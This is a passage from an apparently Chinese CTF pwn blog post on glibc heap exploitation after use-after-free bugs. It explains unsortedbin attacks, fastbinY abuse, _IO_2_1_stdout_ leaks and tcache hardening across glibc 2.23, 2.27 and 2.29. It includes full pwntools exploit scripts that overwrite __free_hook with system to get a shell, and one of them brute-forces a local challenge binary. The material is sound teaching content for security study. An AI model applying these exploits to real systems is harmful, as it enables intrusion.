class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>这里就利用realloc调整了一下栈帧</p>
<p> (3)只能是大chunk，即0x400~…</p>
<p> 泄露地址后，直接用unsortedbin attack，修改global_max_fast，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"> </span><br><span class="line">main_arena = libc.sym[<span class="string">'main_arena'</span>]</span><br><span class="line">fastbinsY = main_arena + <span class="number">8</span></span><br><span class="line">target_addr_binsY = libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x10</span></span><br><span class="line">idx = (target_addr_binsY - fastbinsY) / <span class="number">8</span></span><br><span class="line">size = idx * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">add_malloc(<span class="number">0x4f8</span>,<span class="string">"\xaa"</span>*<span class="number">0x4f8</span>)        <span class="comment">#idx1</span></span><br><span class="line">add_malloc(<span class="number">0x4f8</span>,<span class="string">'/bin/sh\x00'</span>)        <span class="comment">#idx2</span></span><br><span class="line"> </span><br><span class="line">add_malloc(size<span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)        <span class="comment">#idx3</span></span><br><span class="line">add_malloc(size+<span class="number">0x10</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)    <span class="comment">#idx4</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64Leakbase(unsortedBinIdx + libc.sym[<span class="string">'main_arena'</span>])</span><br><span class="line">lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"> </span><br><span class="line">target_addr = libc_base+libc.sym[<span class="string">'global_max_fast'</span>]</span><br><span class="line">log.info(<span class="string">"target_addr:0x%x"</span>%target_addr)</span><br><span class="line"><span class="comment">#change unsortedBinchunkA</span></span><br><span class="line"><span class="comment">#chunkA.fd could be anything</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4f8</span>,p64(<span class="number">0x0</span>)+p64(target_addr<span class="number">-0x10</span>))</span><br><span class="line"><span class="comment">#have to malloc all from unsortedbin</span></span><br><span class="line">add_malloc(<span class="number">0x4f8</span>,<span class="string">"\xaa"</span>*<span class="number">0x4f8</span>)        <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x8</span>,p64(size+<span class="number">0x10</span>+<span class="number">1</span>))</span><br><span class="line">add_malloc(size<span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">0x8</span>,p64(libc_base + target_addr_binsY <span class="number">-0x8</span>))</span><br><span class="line">add_malloc(size+<span class="number">0x10</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">add_malloc(size+<span class="number">0x10</span><span class="number">-0x8</span>,p64(<span class="number">0x0</span>)+p64(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<p>(4)只能是某个特定大小的chunk，比如只能是0x40，0x60，一般不会只能是一个大小的，不然基本无法利用。</p>
<p> 泄露地址heap地址后，修改size位进入unsortedbin中，再泄露libc地址。由于无法0x56和0x7f字节错位利用，所以只能利用一个size的bin，释放之后在fastbinY中留下size，然后另一个size申请过去，修改top_chunk到malloc_hook处即可，之后类似。</p>
<h4 id="3-UAF-无Leak-Size不做限制"><a href="#3-UAF-无Leak-Size不做限制" class="headerlink" title="3.UAF + 无Leak + Size不做限制"></a>3.UAF + 无Leak + Size不做限制</h4><p>▲无Leak通常需要爆破，同样用unsortedbin attack部分写unsortedbin中chunk的bk指针，修改global_max_fast，之后利用fastbinY机制劫持_IO_2_1<em>stdout</em>结构体，泄露出地址，然后就和之前一样，再利用fastbinY机制劫持free_hook即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注释头</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#one_gadget = getOnegadget()</span></span><br><span class="line">    heap_base = leak_heap()</span><br><span class="line">    libc_base = leak_libc() - libc.sym[<span class="string">'printf'</span>]</span><br><span class="line">    elf_base = leak_elf() - elf.sym[<span class="string">'main'</span>]</span><br><span class="line">    log.info(<span class="string">"heap_base:0x%x"</span>%heap_base)</span><br><span class="line">    log.info(<span class="string">"libc_base:0x%x"</span>%libc_base)</span><br><span class="line">    log.info(<span class="string">"elf_base:0x%x"</span>%elf_base)</span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x1000</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#prepare data-----------------------------------------------------------</span></span><br><span class="line">    guess_libc = <span class="number">0x9000</span></span><br><span class="line">    guess_heap = <span class="number">0x2000</span></span><br><span class="line">    fastbinsY = guess_libc + libc.sym[<span class="string">'main_arena'</span>] + <span class="number">8</span></span><br><span class="line">    _IO_read_end = guess_libc + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x10</span></span><br><span class="line">    _IO_write_base = guess_libc + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x20</span></span><br><span class="line">    _IO_write_ptr = guess_libc + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x28</span></span><br><span class="line">    _IO_write_end = guess_libc + libc.sym[<span class="string">'_IO_2_1_stdout_'</span>] + <span class="number">0x30</span></span><br><span class="line"> </span><br><span class="line">    idx_read_end = (_IO_read_end - fastbinsY) / <span class="number">8</span></span><br><span class="line">    size_read_end = idx_read_end * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line">    idx_write_base = (_IO_write_base - fastbinsY) / <span class="number">8</span></span><br><span class="line">    size_write_base = idx_write_base * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line">    idx_write_ptr = (_IO_write_ptr - fastbinsY) / <span class="number">8</span></span><br><span class="line">    size_write_ptr = idx_write_ptr * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line">    idx_write_end = (_IO_write_end - fastbinsY) / <span class="number">8</span></span><br><span class="line">    size_write_end = idx_write_end * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line">    target_addr_gMF = guess_libc + libc.sym[<span class="string">'global_max_fast'</span>]</span><br><span class="line"> </span><br><span class="line">    fastbinsY = libc.sym[<span class="string">'main_arena'</span>] + <span class="number">8</span></span><br><span class="line">    target_addr_binsY = libc.sym[<span class="string">'__free_hook'</span>]<span class="number">-0x10</span></span><br><span class="line">    idx_free_hook = (target_addr_binsY - fastbinsY) / <span class="number">8</span></span><br><span class="line">    size_free_hook = idx_free_hook * <span class="number">0x10</span> + <span class="number">0x20</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">#read_end-------------------------------------------------------------</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x00"</span>*<span class="number">0x38</span>)                <span class="comment">#idx    0x1</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x00"</span>*<span class="number">0x38</span>)                <span class="comment">#idx    0x2  point free  read_end</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x03"</span>*<span class="number">0x38</span>)                <span class="comment">#idx    0x3</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x04'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'\x04'</span>*<span class="number">0x18</span>)        <span class="comment">#idx    0x4</span></span><br><span class="line"> </span><br><span class="line">    free(<span class="number">0x1</span>)</span><br><span class="line">    <span class="comment">#free(2)</span></span><br><span class="line">    free(<span class="number">0x3</span>)</span><br><span class="line">    edit(<span class="number">0x3</span>,<span class="number">0x1</span>,<span class="string">'\x20'</span>)</span><br><span class="line">    edit(<span class="number">0x1</span>,<span class="number">0x20</span>,p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>))</span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x05'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'\x05'</span>*<span class="number">0x18</span>)                <span class="comment">#idx    0x5</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x06'</span>*<span class="number">0x18</span>)                                    <span class="comment">#idx    0x6 #point change size</span></span><br><span class="line">    <span class="comment">#---------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#write_end can not be so far from wirte_base</span></span><br><span class="line">    add_malloc(size_write_end<span class="number">-0x8</span>,(p64(<span class="number">0x0</span>)+p64(<span class="number">0x21</span>))*((size_write_end<span class="number">-0x10</span>)/<span class="number">0x10</span>))                <span class="comment">#idx    0x7</span></span><br><span class="line">    add_malloc(size_write_ptr<span class="number">-0x8</span>,(p64(<span class="number">0x0</span>)+p64(<span class="number">0x21</span>))*((size_write_ptr<span class="number">-0x10</span>)/<span class="number">0x10</span>))                <span class="comment">#idx    0x8</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#write_base-----------------------------------------------------------</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x00"</span>*<span class="number">0x38</span>)                <span class="comment">#idx    0x9</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\xaa"</span>*<span class="number">0x38</span>)                <span class="comment">#idx    0xa</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">"\x0b"</span>*<span class="number">0x38</span>)                <span class="comment">#idx    0xb</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x0c'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'\xaa'</span>*<span class="number">0x18</span>)        <span class="comment">#idx    0xc</span></span><br><span class="line"> </span><br><span class="line">    free(<span class="number">0x9</span>)</span><br><span class="line">    <span class="comment">#free(2)</span></span><br><span class="line">    free(<span class="number">0xb</span>)</span><br><span class="line">    edit(<span class="number">0xb</span>,<span class="number">0x2</span>,p16((guess_heap+<span class="number">0x1000</span>+<span class="number">0x40</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">    edit(<span class="number">0x9</span>,<span class="number">0x20</span>,p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(<span class="number">0x41</span>))</span><br><span class="line"> </span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x0d'</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">'\x05'</span>*<span class="number">0x18</span>)                <span class="comment">#idx    0xd</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x0e'</span>*<span class="number">0x18</span>)                                    <span class="comment">#idx    0xe #point free</span></span><br><span class="line">    <span class="comment">#---------------------------------------------------------------------</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#prepare for free_hook</span></span><br><span class="line">    add_malloc(size_free_hook<span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)            <span class="comment">#idxf</span></span><br><span class="line">    add_malloc(size_free_hook+<span class="number">0x10</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)        <span class="comment">#idx10</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#unsortedbin attack</span></span><br><span class="line">    add_malloc(<span class="number">0x4f8</span>,<span class="string">'\x11'</span>*<span class="number">0x4f8</span>)            <span class="comment">#idx 0x11</span></span><br><span class="line">    add_malloc(<span class="number">0x38</span>,<span class="string">'\x12'</span>*<span class="number">0x38</span>)            <span class="comment">#idx 0x12</span></span><br><span class="line">    free(<span class="number">0x11</span>)</span><br><span class="line">    edit(<span class="number">0x11</span>,<span class="number">0x8</span>+<span class="number">0x2</span>,p64(<span class="number">0x0</span>)+p16((target_addr_gMF&amp;<span class="number">0xffff</span>)<span class="number">-0x10</span>))</span><br><span class="line">    add_malloc(<span class="number">0x4f8</span>,<span class="string">'/bin/sh\x00'</span>)            <span class="comment">#idx 0x13</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#change write_base</span></span><br><span class="line">    edit_m(<span class="number">0x6</span>,<span class="number">0x20</span>,p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(size_write_base+<span class="number">1</span>))</span><br><span class="line">    free_m(<span class="number">0xe</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#change write_end and write_ptr</span></span><br><span class="line">    free_m(<span class="number">0x7</span>)</span><br><span class="line">    free_m(<span class="number">0x8</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment">#change read_end</span></span><br><span class="line">    edit_m(<span class="number">0x6</span>,<span class="number">0x20</span>,p64(<span class="number">0x0</span>)*<span class="number">3</span>+p64(size_read_end+<span class="number">1</span>))</span><br><span class="line">    free_m(<span class="number">0x2</span>)</span><br><span class="line"> </span><br><span class="line">    libc_base = u64Leakbase(libc.sym[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">131</span>)</span><br><span class="line">    lg(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#write free_hook - 0x10</span></span><br><span class="line">    free(<span class="number">0xf</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#left size</span></span><br><span class="line">    edit(<span class="number">0xf</span>,<span class="number">0x8</span>,p64(size_free_hook+<span class="number">0x10</span>+<span class="number">1</span>))</span><br><span class="line">    add_malloc(size_free_hook<span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#get free_hook - 0x8</span></span><br><span class="line">    free(<span class="number">0x10</span>)</span><br><span class="line">    edit(<span class="number">0x10</span>,<span class="number">0x8</span>,p64(libc_base + target_addr_binsY <span class="number">-0x8</span>))</span><br><span class="line">    add_malloc(size_free_hook+<span class="number">0x10</span><span class="number">-0x8</span>,<span class="string">'PIG007NB'</span>)</span><br><span class="line">    add_malloc(size_free_hook+<span class="number">0x10</span><span class="number">-0x8</span>,p64(<span class="number">0x0</span>)+p64(libc_base + libc.sym[<span class="string">'system'</span>]))</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    free(<span class="number">0x13</span>)</span><br><span class="line">    it()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = process(<span class="string">"./note"</span>)</span><br><span class="line">        lg(<span class="string">"Times:"</span>,i)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>▲通常需要注意的是，write_base和write_end不能相距太远，不然很容易数据量过大而崩溃。还有这里最后泄露地址是</p>
<p> libc_base = u64Leakbase(libc.sym[‘_IO_2_1<em>stdout</em>‘]+131)</p>
<p> 这是因为IO流的机制，会在写入数据的0x10处上写下libc.sym[‘_IO_2_1<em>stdout</em>‘]+131的地址，所以这里直接就能泄露。</p>
<p> ▲题外话：爆破的数学期望为1/256</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_TQJETXA3DN3WMDE.jpg" alt="img"></p>
<h4 id="4-UAF-无Leak-Size做限制"><a href="#4-UAF-无Leak-Size做限制" class="headerlink" title="4.UAF + 无Leak + Size做限制"></a>4.UAF + 无Leak + Size做限制</h4><p>▲同样size做限制一般也分为以下几种 </p>
<p>(1)只能是小Chunk，即0x20~0x80： </p>
<p>这个也是一样的，利用UAF部分写入heap_addr制造堆块重叠，修改size域，放入unsortedbin，然后部分写入libc_addr打unsortedbin attack修改global_max_fast，之后就类似了，劫持_IO_2_1_stdout泄露地址，fastbinY机制劫持main_arena，修复unsortedbin后改top_chunk劫持malloc_hook即可。 </p>
<p>(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。 </p>
<p>类似，部分写修改size域打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址。fastbinY机制劫持free_hook。 </p>
<p>(3)只能是大chunk，即0x400~… </p>
<p>直接用部分写libc_addr打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。</p>
<p> (4)指定的chunk size。</p>
<p> ▲其实对于UAF来说，size做没做限制都差不了太多，因为都可以部分写堆块地址制造堆重叠，然后就能修改size域，唯一区分的就是申请时候的限制，小的就打top_chunk，大的就直接打_free_hook。比较有意思的一点就是限制特定size，一般限制为两个，以前遇到0x20和0x30，也有0x40和0x50的，都是大同小异，借用fastbinY机制留下size后申请过去即可。</p>
<h3 id="二、Glibc2-27"><a href="#二、Glibc2-27" class="headerlink" title="二、Glibc2.27"></a>二、Glibc2.27</h3><p>UAF在这个版本下对于tcache实在是好用，由于tcache不检查size位，也不检查FD，只要泄露了地址，加上UAF就能实现任意申请。而对于无show功能的，既可以借助unsortedbin踩下地址后爆破直接申请，也可以unsortedbin attack劫持global_fast_max之后再劫持IO_2_1_stdout结构泄露地址。</p>
<h4 id="1-Sashing机制带来的改变"><a href="#1-Sashing机制带来的改变" class="headerlink" title="1.Sashing机制带来的改变"></a>1.Sashing机制带来的改变</h4><h5 id="1-加入的检查判断："><a href="#1-加入的检查判断：" class="headerlink" title="(1)加入的检查判断："></a>(1)加入的检查判断：</h5><p>需要注意的一点是，由于加入了tcache的stahing机制，所以在从fastbin中申请时会有一个判断：</p>
<p> <strong>（这个在2.26开始就存在的，只不过可能代码不太一样，所以有tcache的地方，fastbin修改fd从而在main_arena上留下fd的功能就无法使用了）</strong></p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_VHSP8Y8GXRP72D7.jpg" alt="Snipaste_2021-08-19_21-32-57"></p>
<p>由于tcache的stashing机制，如果从fastbin中取chunk，那么如果该大小的fastbin链中还有其他chunk，则会尝试将该大小的fastbin链中剩余的chunk都放入对应大小的tcache中，那么就会出现如上的对fastbin中的fd进行取出检查，这里我设置了fastbin中Chunk的fd为0x71，即rdx的值，导致出错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;注释头</span><br><span class="line"> </span><br><span class="line">*fb &#x3D; tc_victim-&gt;fd;</span><br><span class="line"> </span><br><span class="line">mov    rax, qword ptr [rdx + 0x10]</span><br></pre></td></tr></table></figure>

<p>这个代码以及汇编赋值，使得[rdx+0x10]，即取0x71的fd指针，那肯定会出错。同样的，如果修改fastbin中chunk的fd也不再是简单地伪造size了，还需要考虑对应FD的fd指针有效性。</p>
<h5 id="2-对抗利用："><a href="#2-对抗利用：" class="headerlink" title="(2)对抗利用："></a>(2)对抗利用：</h5><p>①have_fastchunks:</p>
<p>虽然FD不能留下伪造地址，但是可以释放一个chunk进入fastbin，将main_arena.have_fastchunks置1，之后利用main_arena.have_fastchunks留下的0x1在上面来申请0x100的字节错位，但是这个需要先修改global_max_fast才能申请0x100的fastbinChunk。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_EYYC73JPATQ5QW5.jpg" alt="Snipaste_2021-08-27_14-48-12"></p>
<p>④top_chunk:</p>
<p>此外，借用爆破chunk地址，将top_chunk的0x56当作合法size也是可以的。</p>
<p><img src= "/img/loading.gif" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/904686_RBZB4XMVZ62WZA2.jpg" alt="Snipaste_2021-08-27_14-42-24"></p>
<p>但是其实也没差，既然有tcache，那我还用fastbin申请干啥，直接tcache获得地址之后任意申请不就完了，除非全是calloc，但这种情况其实还有更方便的解法，即<code>house of banana</code>。所以要是碰到2.27版本的，简直就是烧高香了。</p>
<h4 id="2-Glibc2-27Tcache题外话："><a href="#2-Glibc2-27Tcache题外话：" class="headerlink" title="2.Glibc2.27Tcache题外话："></a>2.Glibc2.27Tcache题外话：</h4><p>现今版本，2020年09月10日开始，从2.27-3ubuntu1.3开始，就已经对tcache做了部分修改，很接近2.29的，而现在的题目基本都是基于这种增强型版本的，已经不存在double free了。</p>
<p> <a href="https://www.anquanke.com/post/id/219292#h2-2" target="_blank" rel="noopener">Glibc 2.27关于Tcache的增强保护 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p>新增如下：</p>
<h5 id="1-Key字段新增："><a href="#1-Key字段新增：" class="headerlink" title="(1)Key字段新增："></a>(1)Key字段新增：</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>同样的对应tcache_put会加入key字段，tcache_get中会清除key字段，_int_free函数会<strong>根据key字段</strong>判断double free。</p>
<p> 这里讲个小技巧，如果发现题目的libc.so版本在2.27-3ubuntu1.3之下，那么就没有key字段，存在无限制的double free，直接搞定。而常规的2.28版本其实也还存在double free，查看_int_free相关源码即可发现。</p>
<p> 具体利用和绕过后面讲。</p>
<h5 id="2-Tcache数量限制"><a href="#2-Tcache数量限制" class="headerlink" title="(2)Tcache数量限制"></a>(2)Tcache数量限制</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_TCACHE_COUNT 127  <span class="comment">/* Maximum value of counts[] entries. */</span></span></span><br></pre></td></tr></table></figure>

<p>这个没发现有啥用，传统的只有2.30开始才用到了这个，低版本连定义都没有，除了这个增强型的2.27</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//2.30</span></span><br><span class="line"> </span><br><span class="line">do_set_tcache_count (<span class="keyword">size_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value &lt;= MAX_TCACHE_COUNT)</span><br><span class="line">    &#123;</span><br><span class="line">        LIBC_PROBE (memory_tunable_tcache_count, <span class="number">2</span>, value, mp_.tcache_count);</span><br><span class="line">        mp_.tcache_count = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这就很迷惑，通常定义的tcache_count是7，而这里却要求小于MAX_TCACHE_COUNT(127)，是因为GNU的其他功能可能会改变tcache的结构吗，比如将tcache_count修改为127，扩大tcache来使用吗，等待大佬发现漏洞。</p>
<p> 另外该文章中还说了realloc对应memcpy的使用修改，感觉没啥用。</p>
<p> 总的来说，其实就相当于将2.27的tcache增强成了2.29，其他的到没啥变化。</p>
<h3 id="三、Glibc2-29"><a href="#三、Glibc2-29" class="headerlink" title="三、Glibc2.29"></a>三、Glibc2.29</h3><h4 id="1-部分手段失效"><a href="#1-部分手段失效" class="headerlink" title="1.部分手段失效"></a>1.部分手段失效</h4><h5 id="1-unsortedbin-attack失效"><a href="#1-unsortedbin-attack失效" class="headerlink" title="(1)unsortedbin attack失效"></a>(1)unsortedbin attack失效</h5><p>这个版本下的unsortedbin attck已经失效，原因是新增如下检查：</p>
